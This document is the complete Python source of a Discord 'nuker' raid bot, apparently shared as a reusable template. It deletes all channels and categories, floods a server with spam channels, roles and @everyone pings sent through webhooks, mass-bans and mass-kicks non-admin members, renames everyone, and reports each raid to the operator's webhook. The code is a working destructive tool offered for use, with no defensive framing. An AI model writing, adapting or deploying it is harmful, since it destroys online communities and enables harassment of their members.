import discord
from discord.ext import commands
import asyncio
import random

token = "token here"  # bot token, used for login, required
prefix = "."  # command prefix, triggers bot commands, set to .
channel_names = ["lmao", "my template js better", "anc-temp", "channel", "channel"]  # list of names, used for new channels, random choice
role_names    = ["ancs template made this", "anc temp ontop", "role", "role2", "role3"]  # list of names, used for new roles, random choice
spam_message  = "@everyone @here nuked"  # message to spam
spam_embed   = discord.Embed(title="embed title", description="embed message", color=0xff0000)  # embed
spam_embed.set_footer(text="temp if you want this too https://github.com/anc-w/nuker-temp")  # footer text for embed
spam_embed.set_image(url="")  # image url
members_needed = 10  # minimum members, bot leaves server theres less members than this number
log_hook = "hook"  # webhook url, logs command usage, optional
protected_servers = [server id here]  # list of server ids, actions blocked, no execution
cooldown = 5  # cooldown seconds, per user, prevents spam
cooldown_bypass = ["user ids here", "seperated by comma"]  # list of user ids, immune to cooldown, bypass list

try:
    intents = discord.Intents.all()
except AttributeError:
    intents = None

if intents:
    bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)
else:
    bot = commands.Bot(command_prefix=prefix, help_command=None)

cooldowns = {}

@bot.event
async def on_ready():
    print(f'logged in as {bot.user} ({bot.user.id})')
    print('online made by anc')

@bot.event
async def on_guild_join(guild):
    if guild.member_count < members_needed:
        print(f"[anc temp] left small server {guild.name} ({guild.id})")
        await guild.leave()

@bot.event
async def on_guild_channel_create(channel):
    try:
        webhook = await channel.create_webhook(name="name")
        for _ in range(50):
            await asyncio.gather(
                webhook.send(spam_message, embed=spam_embed),
                channel.send(spam_message, embed=spam_embed)
            )
    except:
        pass

@bot.event
async def on_command(ctx):
    print(f"{ctx.author} used .{ctx.command} in {ctx.guild}")
    try:
        hook = discord.Webhook.from_url(log_hook, session=discord.ClientSession())
        embed = discord.Embed(title="command used", color=0xff0000)
        embed.add_field(name="user", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        embed.add_field(name="guild", value=f"{ctx.guild.name} ({ctx.guild.id})", inline=False)
        embed.add_field(name="command", value=ctx.command.name, inline=False)
        await hook.send(embed=embed)
    except:
        pass

def on_cooldown(author_id: int) -> bool:
    if author_id in cooldown_bypass:
        return True
    now = asyncio.get_event_loop().time()
    if author_id in cooldowns and now - cooldowns[author_id] < cooldown:
        return False
    cooldowns[author_id] = now
    return True

async def log_event(title: str, ctx):
    try:
        hook = discord.Webhook.from_url(log_hook, session=discord.ClientSession())
        embed = discord.Embed(title=title, color=0xff0000 if "started" in title else 0x00ff00)
        embed.add_field(name="user", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        embed.add_field(name="guild", value=f"{ctx.guild.name} ({ctx.guild.id})", inline=False)
        await hook.send(embed=embed)
    except:
        pass

@bot.command()
async def nuke(ctx):
    if ctx.guild.id in protected_servers:
        return await ctx.send("protected server, cant execute this action")
    if not on_cooldown(ctx.author.id):
        return await ctx.send("ur on cooldown")
    await log_event("nuke started", ctx)
    
    tasks = []
    
    for ch in list(ctx.guild.channels):
        try:
            tasks.append(asyncio.create_task(ch.delete()))
        except:
            pass
    for cat in list(ctx.guild.categories):
        try:
            tasks.append(asyncio.create_task(cat.delete()))
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    tasks.clear()
    
    for _ in range(50):
        name = random.choice(channel_names) + f"-{random.randint(1000,9999)}"
        try:
            tasks.append(asyncio.create_task(ctx.guild.create_text_channel(name)))
            await asyncio.sleep(0.03)
        except:
            pass
    
    for _ in range(50):
        name = random.choice(role_names) + f"-{random.randint(100,999)}"
        try:
            tasks.append(asyncio.create_task(ctx.guild.create_role(name=name)))
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await log_event("nuke complete", ctx)

@bot.command()
async def deletechannels(ctx):
    if ctx.guild.id in protected_servers:
        return await ctx.send("protected server, cant execute this action")
    if not on_cooldown(ctx.author.id):
        return await ctx.send("ur on cooldown")
    
    await ctx.send("deleting all channels")
    count = 0
    tasks = []
    
    for ch in list(ctx.guild.channels):
        try:
            tasks.append(asyncio.create_task(ch.delete()))
            count += 1
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def banall(ctx):
    if ctx.guild.id in protected_servers:
        return await ctx.send("protected server, cant execute this action")
    if not on_cooldown(ctx.author.id):
        return await ctx.send("ur on cooldown")
    
    await ctx.send("banning everyone possible")
    count = 0
    tasks = []
    
    for m in list(ctx.guild.members):
        if m == bot.user or m.id in cooldown_bypass or m.guild_permissions.administrator:
            continue
        try:
            tasks.append(asyncio.create_task(m.ban(reason="anc raid")))
            count += 1
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send(f"banned {count} members")

@bot.command()
async def kickall(ctx):
    if ctx.guild.id in protected_servers:
        return await ctx.send("protected server, cant execute this action")
    if not on_cooldown(ctx.author.id):
        return await ctx.send("ur on cooldown")
    
    await ctx.send("kicking remaining members")
    count = 0
    tasks = []
    
    for m in list(ctx.guild.members):
        if m == bot.user or m.id in cooldown_bypass or m.guild_permissions.administrator:
            continue
        try:
            tasks.append(asyncio.create_task(m.kick(reason="anc raid")))
            count += 1
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send(f"kicked {count} members")

@bot.command()
async def renameall(ctx):
    if ctx.guild.id in protected_servers:
        return await ctx.send("protected server, cant execute this action")
    if not on_cooldown(ctx.author.id):
        return await ctx.send("ur on cooldown")
    
    await ctx.send("renaming")
    count = 0
    tasks = []
    
    for m in list(ctx.guild.members):
        if m == bot.user or not m.guild_permissions.change_nickname:
            continue
        try:
            tasks.append(asyncio.create_task(m.edit(nick="nuked with anc temp")))
            count += 1
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send(f"renamed {count} members")

bot.run(token)
